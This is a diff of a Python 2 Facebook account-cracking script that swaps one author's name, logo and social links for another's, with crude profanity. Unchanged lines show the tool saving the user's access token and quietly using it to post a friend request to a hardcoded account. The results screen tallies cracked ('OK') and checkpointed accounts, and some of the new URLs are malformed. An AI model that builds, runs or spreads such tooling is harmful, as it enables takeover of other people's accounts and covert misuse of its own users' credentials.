@@ -1,8 +1,8 @@
 #!/usr/bin/python2
 #coding=utf-8
-#THE OFFICAL FARIYA KHAN
+#THE OFFICAL FUCKER SONU
 #YOUR ATTITUDE IN MY FOOT DON'T EDIT MY SCRIPT LOL
-#FOLLOWS ON FACEBOOK itzfariya786
+#FOLLOWS ON FACEBOOK sonu.singh.597
 #CONTACT ON FACEBOOK
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
@@ -70,18 +70,18 @@ Y='\033[1;93m'
 #Dev:TECH ABM
 ##### LOGO #####
 logo = """ 
-\033[1;91m███████╗░█████╗░██████╗░██╗██╗░░░██╗░█████╗░
-\033[1;92m██╔════╝██╔══██╗██╔══██╗██║╚██╗░██╔╝██╔══██╗
-\033[1;93m█████╗░░███████║██████╔╝██║░╚████╔╝░███████║
-\033[1;94m██╔══╝░░██╔══██║██╔══██╗██║░░╚██╔╝░░██╔══██║
-\033[1;95m██║░░░░░██║░░██║██║░░██║██║░░░██║░░░██║░░██║
-\033[1;91m╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝
-                               █▀▀ ▄▀█ █▀█ █
-                               █▀░ █▀█ █▀▄ █
+\033[1;91m######  ######  #     #  #    #
+\033[1;92m#       #    #  # #   #  #    #
+\033[1;93m######  #    #  #  #  #  #    #
+\033[1;94m     #  #    #  #   # #  #    #
+\033[1;95m######  ######  #     #  ######
+\033[1;91mTHE___OFFICIAL___SONU___SINGH
+                               
+                               
                                
 \033[1;96m❋❈╭┳✪✪╤──────────────────────────────────────➛➢
-\033[1;96m♚♚║\033[1;32mCREATOR  : \033[1;32mFARIYA KHAN
-\033[1;96m♚♚║\033[1;32mFACEBOOK : \033[1;32mhttps://www.facebook.com/itzfariya786
+\033[1;96m♚♚║\033[1;32mCREATOR  : \033[1;32mSONU SINGH
+\033[1;96m♚♚║\033[1;32mFACEBOOK : \033[1;32mhttps://www.facebook.com/sonu.singh.597
 \033[1;96m♚♚║\033[1;32mWARNING  : \033[1;32mI M NOT RESPONSIBLE FOR ANY MISS USE
 \033[1;96m❋❈╰┻✪✪╧─────────────────────────────────────➛➢"""
 
@@ -105,18 +105,18 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print """
-\033[1;91m███████╗░█████╗░██████╗░██╗██╗░░░██╗░█████╗░
-\033[1;92m██╔════╝██╔══██╗██╔══██╗██║╚██╗░██╔╝██╔══██╗
-\033[1;93m█████╗░░███████║██████╔╝██║░╚████╔╝░███████║
-\033[1;94m██╔══╝░░██╔══██║██╔══██╗██║░░╚██╔╝░░██╔══██║
-\033[1;95m██║░░░░░██║░░██║██║░░██║██║░░░██║░░░██║░░██║
-\033[1;91m╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝
-                               █▀▀ ▄▀█ █▀█ █
-                               █▀░ █▀█ █▀▄ █
+\033[1;91m######  ######  #     #  #    #
+\033[1;92m#       #    #  # #   #  #    #
+\033[1;93m######  #    #  #  #  #  #    #
+\033[1;94m     #  #    #  #   # #  #    #
+\033[1;95m######  ######  #     #  ######
+\033[1;91mTHE___OFFICIAL___SONU___SINGH
+                               
+                               
 			       
 \033[1;96m❋❈╭┳✪✪╤──────────────────────────────────────➛➢
-\033[1;96m♚♚║\033[1;32mCREATOR  : \033[1;32mFARIYA KHAN
-\033[1;96m♚♚║\033[1;32mFACEBOOK : \033[1;32mhttps://www.facebook.com/itzfariya786
+\033[1;96m♚♚║\033[1;32mCREATOR  : \033[1;32mSONU SINGH
+\033[1;96m♚♚║\033[1;32mFACEBOOK : \033[1;32mhttps://www.facebook.com/sonu.singh.597
 \033[1;96m♚♚║\033[1;32mWARNING  : \033[1;32mI M NOT RESPONSIBLE FOR ANY MISS USE
 \033[1;96m❋❈╰┻✪✪╧─────────────────────────────────────➛➢"""
 
@@ -135,8 +135,8 @@ jalan("\033[0;92m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚
 
 print "\033[1;95m🔀 ⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 🔀"
 
-CorrectUsername = "FARIYA"
-CorrectPassword = "KHAN"
+CorrectUsername = "FUCKER"
+CorrectPassword = "SONU"
 
 loop = 'true'
 while (loop == 'true'):
@@ -148,10 +148,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://m.facebook.com?itzfariya786')
+            os.system('xdg-open https:https://www.youtube.com/channel/UCtRpTQkdoOShDPett68QhOQ')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://m.facebook.com/itzfariya786')
+        os.system('xdg-open httpshttps://www.youtube.com/channel/UCtRpTQkdoOShDPett68QhOQ')
 
 def login():
 	os.system('clear')
@@ -192,7 +192,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful ✅'
-				os.system('xdg-open https://m.facebook.com/itzfariya786')
+				os.system('xdg-open https://www.youtube.com/channel/UCtRpTQkdoOShDPett68QhOQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -477,16 +477,16 @@ def pilih_super():
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
 \033[1;96m❋❈╭┳✪✪╤──────────────────────────────────────➛➢
-\033[1;96m♚♚║\033[1;32mCREATOR  : \033[1;32mFARIYA KHAN
-\033[1;96m♚♚║\033[1;32mFACEBOOK : \033[1;32mhttps://www.facebook.com/itzfariya786
+\033[1;96m♚♚║\033[1;32mCREATOR  : \033[1;32mSONU SINGH
+\033[1;96m♚♚║\033[1;32mFACEBOOK : \033[1;32mhttps://www.facebook.com/sonu.singh.597
 \033[1;96m♚♚║\033[1;32mWARNING  : \033[1;32mI M NOT RESPONSIBLE FOR ANY MISS USE
 \033[1;96m❋❈╰┻✪✪╧─────────────────────────────────────➛➢
   
   
   \033[1;95mTHANK YOU FOR USING OUR TOOL
 \033[1;95mCHECKPOINT ACCOUNT AFTER 7 DAYS
-  \033[1;95mI M NOT RESPONSIBLE FOR ANY MISS USE AUTHOR FARIYA
-\033[1;95m   ⚒️ FARIYA KHAN
+  \033[1;95mI M NOT RESPONSIBLE FOR ANY MISS USE AUTHOR SONU
+\033[1;95m   ⚒️ SONU SINGH
 \033[1;98m🔀 ⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 🔀   """
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
